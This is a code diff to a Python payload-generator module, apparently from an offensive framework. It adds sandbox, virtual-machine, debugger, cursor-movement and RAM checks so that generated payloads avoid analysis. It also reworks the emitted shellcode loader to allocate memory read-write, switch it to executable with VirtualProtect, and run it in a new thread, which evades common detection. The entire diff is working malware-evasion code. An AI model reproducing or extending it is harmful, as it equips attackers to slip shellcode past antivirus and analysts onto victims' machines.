@@ -56,6 +56,15 @@ class PayloadModule:
             "DOMAIN"         : ["X", "Optional: Required internal domain"],
             "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
             "USERNAME"       : ["X", "Optional: The required user account"],
+            "CLICKTRACK"     : ["X", "Optional: Minimum number of clicks to execute payload"],
+            "UTCCHECK"       : ["FALSE", "Optional: Validates system does not use UTC timezone"],
+            "VIRTUALFILES"   : ["FALSE", "Optional: Check if VM supporting files exist"],
+            "VIRTUALDLLS"    : ["FALSE", "Check for dlls loaded in memory"],
+            "CURSORMOVEMENT" : ["FALSE", "Check if cursor is in same position after 30 seconds"],
+            "USERPROMPT"     : ["FALSE", "Make user click prompt prior to execution"],
+            "MINRAM"         : ["FALSE", "Check for at least 3 gigs of RAM"],
+            "SANDBOXPROCESS" : ["FALSE", "Check for common sandbox processes"],
+            "DETECTDEBUG"    : ["FALSE", "Check if debugger is present"],
             "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
         }
 
@@ -73,6 +82,7 @@ class PayloadModule:
         randctypes = evasion_helpers.randomString()
         rand_ptr = evasion_helpers.randomString()
         rand_ht = evasion_helpers.randomString()
+        rand_virtual_protect = evasion_helpers.randomString()
 
         # Generate the shellcode
         if not self.cli_shellcode:
@@ -106,8 +116,9 @@ class PayloadModule:
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
 
             payload_code += '\t' * num_tabs_required + 'import ctypes as ' + randctypes + '\n'
-            payload_code += '\t' * num_tabs_required + rand_ptr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len(' + subbed_shellcode_variable_name + ')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x40))\n'
+            payload_code += '\t' * num_tabs_required + rand_ptr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len('+ subbed_shellcode_variable_name +')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x04))\n'
             payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + rand_ptr + '),' + subbed_shellcode_variable_name + ',' + randctypes + '.c_int(len(' + subbed_shellcode_variable_name + ')))\n'
+            payload_code += '\t' * num_tabs_required + rand_virtual_protect + ' = ' + randctypes + '.windll.kernel32.VirtualProtect(' + randctypes + '.c_int(' + rand_ptr + '),' + randctypes + '.c_int(len(' + subbed_shellcode_variable_name + ')),' + randctypes + '.c_int(0x20),' + randctypes + '.byref(' + randctypes + '.c_uint32(0)))\n'
             payload_code += '\t' * num_tabs_required + rand_ht + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + rand_ptr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
             payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + rand_ht + '),' + randctypes + '.c_int(-1))\n'
 
